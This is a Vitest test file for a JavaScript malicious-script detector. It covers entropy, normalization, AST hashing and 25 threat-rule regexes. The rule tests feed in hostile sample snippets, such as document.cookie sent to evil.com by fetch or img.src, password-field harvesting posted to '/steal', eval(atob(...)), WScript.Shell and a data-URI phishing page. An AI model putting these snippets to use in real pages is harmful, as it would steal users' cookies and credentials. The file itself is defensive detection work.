import { describe, it, expect } from 'vitest';

import { calculateEntropy, normalizeScriptSource, computeASTHash, computeSimilarity } from '../script-utils';
import { JS_THREAT_RULES } from '../types';
import * as acorn from 'acorn';

// ─── calculateEntropy ───

describe('calculateEntropy', () => {
  it('returns ~0 for uniform string', () => {
    expect(calculateEntropy('aaaaaaaaaa')).toBeCloseTo(0, 1);
  });

  it('returns ~1 for two-character repeating string', () => {
    expect(calculateEntropy('abababab')).toBeCloseTo(1, 0);
  });

  it('returns high entropy for random-like string', () => {
    const random = 'x3$kP!9mQ@7zR#4nL%6vB&2wF^5hJ*8cD';
    expect(calculateEntropy(random)).toBeGreaterThan(4.5);
  });

  it('returns 0 for empty string', () => {
    expect(calculateEntropy('')).toBe(0);
  });

  it('returns ~4.7 for lowercase alphabet', () => {
    const alpha = 'abcdefghijklmnopqrstuvwxyz';
    // 26 unique chars → log2(26) ≈ 4.7
    expect(calculateEntropy(alpha)).toBeCloseTo(4.7, 0);
  });
});

// ─── normalizeScriptSource ───

describe('normalizeScriptSource', () => {
  it('strips single-line comments', () => {
    const src = 'var x = 1; // this is a comment\nvar y = 2;';
    expect(normalizeScriptSource(src)).not.toContain('this is a comment');
  });

  it('strips block comments', () => {
    const src = 'var x = /* block comment */ 1;';
    expect(normalizeScriptSource(src)).not.toContain('block comment');
  });

  it('collapses whitespace', () => {
    const src = 'var    x    =    1;';
    expect(normalizeScriptSource(src)).toBe('var x = 1;');
  });

  it('produces same output for semantically equivalent scripts', () => {
    const a = 'var x = 1; // comment A\n  var y  = 2;';
    const b = 'var x = 1;\nvar y = 2;';
    expect(normalizeScriptSource(a)).toBe(normalizeScriptSource(b));
  });

  it('handles multi-line block comments', () => {
    const src = 'var x = 1;\n/* line 1\n   line 2\n   line 3 */\nvar y = 2;';
    const result = normalizeScriptSource(src);
    expect(result).not.toContain('line 1');
    expect(result).toContain('var x = 1;');
    expect(result).toContain('var y = 2;');
  });
});

// ─── computeASTHash ───

function parse(src: string): acorn.Node {
  return acorn.parse(src, { ecmaVersion: 'latest', sourceType: 'module' }) as acorn.Node;
}

describe('computeASTHash', () => {
  it('produces same hash for scripts with different variable names', () => {
    const a = parse('function foo(x) { return x + 1; }');
    const b = parse('function bar(y) { return y + 1; }');
    expect(computeASTHash(a)).toBe(computeASTHash(b));
  });

  it('produces different hash for structurally different scripts', () => {
    const a = parse('function foo(x) { return x + 1; }');
    const b = parse('function bar(y) { return y * 2 + 3; }');
    expect(computeASTHash(a)).not.toBe(computeASTHash(b));
  });

  it('produces same hash despite different literal values', () => {
    const a = parse('var x = 42;');
    const b = parse('var x = 99;');
    expect(computeASTHash(a)).toBe(computeASTHash(b));
  });

  it('produces same hash despite different string literals', () => {
    const a = parse('console.log("hello");');
    const b = parse('console.log("world");');
    expect(computeASTHash(a)).toBe(computeASTHash(b));
  });

  it('returns a 32-character hex string', () => {
    const hash = computeASTHash(parse('var x = 1;'));
    expect(hash).toMatch(/^[0-9a-f]{32}$/);
  });
});

// ─── computeSimilarity ───

describe('computeSimilarity', () => {
  it('returns 1.0 for identical vectors', () => {
    const v = new Map([['a', 2], ['b', 3]]);
    expect(computeSimilarity(v, v)).toBeCloseTo(1.0, 5);
  });

  it('returns 0.0 for orthogonal vectors', () => {
    const v1 = new Map([['a', 1]]);
    const v2 = new Map([['b', 1]]);
    expect(computeSimilarity(v1, v2)).toBeCloseTo(0.0, 5);
  });

  it('returns 0 for empty vectors', () => {
    expect(computeSimilarity(new Map(), new Map())).toBe(0);
  });

  it('returns between 0 and 1 for partial overlap', () => {
    const v1 = new Map([['a', 2], ['b', 1]]);
    const v2 = new Map([['a', 1], ['c', 1]]);
    const sim = computeSimilarity(v1, v2);
    expect(sim).toBeGreaterThan(0);
    expect(sim).toBeLessThan(1);
  });

  it('is symmetric', () => {
    const v1 = new Map([['a', 3], ['b', 1]]);
    const v2 = new Map([['a', 1], ['b', 2], ['c', 1]]);
    expect(computeSimilarity(v1, v2)).toBeCloseTo(computeSimilarity(v2, v1), 10);
  });
});

// ─── JS_THREAT_RULES ───

describe('JS_THREAT_RULES', () => {
  it('contains exactly 25 rules', () => {
    expect(JS_THREAT_RULES).toHaveLength(25);
  });

  it('all rules have required fields', () => {
    for (const rule of JS_THREAT_RULES) {
      expect(rule.id).toBeTruthy();
      expect(rule.pattern).toBeInstanceOf(RegExp);
      expect(rule.score).toBeGreaterThan(0);
      expect(rule.severity).toMatch(/^(low|medium|high|critical)$/);
      expect(rule.category).toMatch(/^(obfuscation|exfiltration|injection|redirect|evasion)$/);
    }
  });

  it('all rule IDs are unique', () => {
    const ids = JS_THREAT_RULES.map(r => r.id);
    expect(new Set(ids).size).toBe(ids.length);
  });

  // --- Obfuscation rules ---

  it('eval_string — matches eval("string")', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'eval_string')!;
    expect(rule.pattern.test('eval("malware()")')).toBe(true);
  });

  it('eval_string — does NOT match eval(variable)', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'eval_string')!;
    expect(rule.pattern.test('eval(someVar)')).toBe(false);
  });

  it('eval_fromcharcode — matches eval(String.fromCharCode(...))', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'eval_fromcharcode')!;
    expect(rule.pattern.test('eval(String.fromCharCode(72,101,108))')).toBe(true);
  });

  it('eval_atob — matches eval(atob(...))', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'eval_atob')!;
    expect(rule.pattern.test('eval(atob("bWFsd2FyZQ=="))')).toBe(true);
  });

  it('eval_function — matches eval(function...)', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'eval_function')!;
    expect(rule.pattern.test('eval(function() { return 42; })')).toBe(true);
  });

  it('function_constructor — matches new Function("...")', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'function_constructor')!;
    expect(rule.pattern.test('new Function("return 1")')).toBe(true);
  });

  it('fromcharcode_chain — matches 3+ codes', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'fromcharcode_chain')!;
    expect(rule.pattern.test('String.fromCharCode(72, 101, 108)')).toBe(true);
  });

  it('charcode_loop — matches for loop with fromCharCode', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'charcode_loop')!;
    expect(rule.pattern.test('for(var i=0;i<a.length;i++){s+=String.fromCharCode(a[i])}')).toBe(true);
  });

  it('hex_escape_heavy — matches 10+ hex escapes', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'hex_escape_heavy')!;
    const hex = '\\x48\\x65\\x6c\\x6c\\x6f\\x20\\x57\\x6f\\x72\\x6c\\x64\\x21';
    expect(rule.pattern.test(hex)).toBe(true);
  });

  it('unicode_escape_heavy — matches 8+ unicode escapes', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'unicode_escape_heavy')!;
    const uni = '\\u0048\\u0065\\u006c\\u006c\\u006f\\u0020\\u0057\\u006f\\u0072\\u006c';
    expect(rule.pattern.test(uni)).toBe(true);
  });

  // --- Evasion ---

  it('silent_catch — matches empty catch block', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'silent_catch')!;
    expect(rule.pattern.test('try { doSomething(); } catch (e) { }')).toBe(true);
  });

  it('silent_catch — does NOT match catch with body', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'silent_catch')!;
    expect(rule.pattern.test('try { x(); } catch (e) { console.error(e); }')).toBe(false);
  });

  // --- Exfiltration ---

  it('cookie_access — matches document.cookie', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'cookie_access')!;
    expect(rule.pattern.test('var c = document.cookie;')).toBe(true);
  });

  it('cookie_to_fetch — matches cookie+fetch proximity', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'cookie_to_fetch')!;
    expect(rule.pattern.test('var c = document.cookie; fetch("https://evil.com", {body: c})')).toBe(true);
  });

  it('cookie_to_xhr — matches cookie+XMLHttpRequest proximity', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'cookie_to_xhr')!;
    expect(rule.pattern.test('var c = document.cookie; var x = new XMLHttpRequest()')).toBe(true);
  });

  it('cookie_to_img — matches cookie+img.src proximity', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'cookie_to_img')!;
    expect(rule.pattern.test('var c = document.cookie; img.src = "https://evil.com?" + c')).toBe(true);
  });

  it('localstorage_exfil — matches localStorage+fetch proximity', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'localstorage_exfil')!;
    expect(rule.pattern.test('var d = localStorage.getItem("key"); fetch("/exfil")')).toBe(true);
  });

  it('credential_harvest — matches password field query + fetch', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'credential_harvest')!;
    expect(rule.pattern.test('var p = querySelector("input[type=password]"); fetch("/steal")')).toBe(true);
  });

  // --- Injection ---

  it('innerhtml_dynamic — matches dynamic innerHTML assignment', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'innerhtml_dynamic')!;
    expect(rule.pattern.test('el.innerHTML = userInput;')).toBe(true);
  });

  it('document_write — matches document.write()', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'document_write')!;
    expect(rule.pattern.test('document.write("<script>alert(1)</script>")')).toBe(true);
  });

  it('dynamic_script_create — matches createElement("script")', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'dynamic_script_create')!;
    expect(rule.pattern.test('document.createElement("script")')).toBe(true);
  });

  it('dynamic_iframe_create — matches createElement("iframe")', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'dynamic_iframe_create')!;
    expect(rule.pattern.test('document.createElement("iframe")')).toBe(true);
  });

  it('activex_object — matches ActiveX creation', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'activex_object')!;
    expect(rule.pattern.test('var x = new ActiveXObject("WScript.Shell")')).toBe(true);
  });

  it('wscript_shell — matches WScript.Shell', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'wscript_shell')!;
    expect(rule.pattern.test('WScript.Shell')).toBe(true);
  });

  // --- Redirect ---

  it('location_redirect — matches dynamic redirect', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'location_redirect')!;
    expect(rule.pattern.test('window.location.href = "https://evil.com"')).toBe(true);
  });

  it('location_redirect — does NOT match comparison', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'location_redirect')!;
    expect(rule.pattern.test('if (window.location.href === "https://example.com")')).toBe(false);
  });

  it('meta_refresh_inject — matches innerHTML meta refresh', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'meta_refresh_inject')!;
    expect(rule.pattern.test('el.innerHTML = "<meta http-equiv=refresh content=0;url=evil>"')).toBe(true);
  });

  it('window_open_data — matches window.open with data: URI', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'window_open_data')!;
    expect(rule.pattern.test('window.open("data:text/html,<h1>phishing</h1>")')).toBe(true);
  });
});
